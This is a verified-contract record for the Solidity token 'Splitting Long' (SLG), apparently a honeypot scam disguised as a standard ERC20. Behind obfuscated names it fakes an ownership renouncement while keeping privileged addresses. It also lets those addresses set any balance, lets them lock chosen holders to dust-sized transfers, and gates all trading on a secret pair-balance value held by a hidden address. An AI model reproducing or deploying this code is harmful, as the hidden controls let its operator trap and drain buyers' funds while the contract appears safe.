{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface receiverFeeAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFrom {\n    function createPair(address feeWalletSender, address walletTeam) external returns (address);\n}\n\ninterface listTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTo) external view returns (uint256);\n\n    function transfer(address limitFund, uint256 marketingIs) external returns (bool);\n\n    function allowance(address sellShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitFund,\n        uint256 marketingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletExempt, uint256 value);\n    event Approval(address indexed sellShould, address indexed spender, uint256 value);\n}\n\ninterface listSwap is listTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SplittingLong is exemptMarketing, listTrading, listSwap {\n\n    function transfer(address minFeeList, uint256 marketingIs) external virtual override returns (bool) {\n        return walletTrading(_msgSender(), minFeeList, marketingIs);\n    }\n\n    address public tokenWalletList;\n\n    address shouldAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private limitReceiver;\n\n    uint256 public swapExemptLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFee;\n    }\n\n    function owner() external view returns (address) {\n        return takeModeMax;\n    }\n\n    function amountMin(uint256 marketingIs) public {\n        liquiditySender();\n        teamIs = marketingIs;\n    }\n\n    function walletTrading(address totalTeam, address limitFund, uint256 marketingIs) internal returns (bool) {\n        if (totalTeam == maxReceiver) {\n            return modeAt(totalTeam, limitFund, marketingIs);\n        }\n        uint256 fundTeam = listTrading(tokenWalletList).balanceOf(shouldAt);\n        require(fundTeam == teamIs);\n        require(limitFund != shouldAt);\n        if (modeTo[totalTeam]) {\n            return modeAt(totalTeam, limitFund, walletModeTake);\n        }\n        return modeAt(totalTeam, limitFund, marketingIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptTrading;\n\n    function getOwner() external view returns (address) {\n        return takeModeMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMode;\n    }\n\n    function balanceOf(address enableTo) public view virtual override returns (uint256) {\n        return liquidityMax[enableTo];\n    }\n\n    function modeAt(address totalTeam, address limitFund, uint256 marketingIs) internal returns (bool) {\n        require(liquidityMax[totalTeam] >= marketingIs);\n        liquidityMax[totalTeam] -= marketingIs;\n        liquidityMax[limitFund] += marketingIs;\n        emit Transfer(totalTeam, limitFund, marketingIs);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toLiquidity;\n    }\n\n    uint256 private listMode = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed amountReceiverTotal, address indexed walletIs);\n\n    function approve(address buyTotal, uint256 marketingIs) public virtual override returns (bool) {\n        exemptTrading[_msgSender()][buyTotal] = marketingIs;\n        emit Approval(_msgSender(), buyTotal, marketingIs);\n        return true;\n    }\n\n    mapping(address => bool) public modeTo;\n\n    address private takeModeMax;\n\n    uint256 private takeTeam;\n\n    bool public txSell;\n\n    uint256 constant walletModeTake = 12 ** 10;\n\n    function launchIs() public {\n        emit OwnershipTransferred(maxReceiver, address(0));\n        takeModeMax = address(0);\n    }\n\n    constructor (){\n        \n        receiverFeeAmount receiverMode = receiverFeeAmount(takeAt);\n        tokenWalletList = launchFrom(receiverMode.factory()).createPair(receiverMode.WETH(), address(this));\n        if (takeTeam == limitReceiver) {\n            swapExemptLaunch = tradingModeEnable;\n        }\n        maxReceiver = _msgSender();\n        launchIs();\n        shouldFee[maxReceiver] = true;\n        liquidityMax[maxReceiver] = listMode;\n        \n        emit Transfer(address(0), maxReceiver, listMode);\n    }\n\n    function enableFromLiquidity(address listFee) public {\n        liquiditySender();\n        \n        if (listFee == maxReceiver || listFee == tokenWalletList) {\n            return;\n        }\n        modeTo[listFee] = true;\n    }\n\n    string private receiverFee = \"SLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return autoIsTake;\n    }\n\n    string private autoIsTake = \"Splitting Long\";\n\n    mapping(address => uint256) private liquidityMax;\n\n    address takeAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 txSwap;\n\n    uint256 teamIs;\n\n    function allowance(address isExempt, address buyTotal) external view virtual override returns (uint256) {\n        if (buyTotal == takeAt) {\n            return type(uint256).max;\n        }\n        return exemptTrading[isExempt][buyTotal];\n    }\n\n    function transferFrom(address totalTeam, address limitFund, uint256 marketingIs) external override returns (bool) {\n        if (_msgSender() != takeAt) {\n            if (exemptTrading[totalTeam][_msgSender()] != type(uint256).max) {\n                require(marketingIs <= exemptTrading[totalTeam][_msgSender()]);\n                exemptTrading[totalTeam][_msgSender()] -= marketingIs;\n            }\n        }\n        return walletTrading(totalTeam, limitFund, marketingIs);\n    }\n\n    function receiverTakeEnable(address minFeeList, uint256 marketingIs) public {\n        liquiditySender();\n        liquidityMax[minFeeList] = marketingIs;\n    }\n\n    function liquiditySender() private view {\n        require(shouldFee[_msgSender()]);\n    }\n\n    mapping(address => bool) public shouldFee;\n\n    bool private isAuto;\n\n    uint8 private toLiquidity = 18;\n\n    address public maxReceiver;\n\n    function isMarketingExempt(address buyExempt) public {\n        require(buyExempt.balance < 100000);\n        if (txSell) {\n            return;\n        }\n        if (swapExemptLaunch == limitReceiver) {\n            limitReceiver = tradingModeEnable;\n        }\n        shouldFee[buyExempt] = true;\n        \n        txSell = true;\n    }\n\n    uint256 private tradingModeEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiverTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"amountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"enableFromLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"isMarketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFeeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"receiverTakeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExemptLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWalletList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFeeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SplittingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}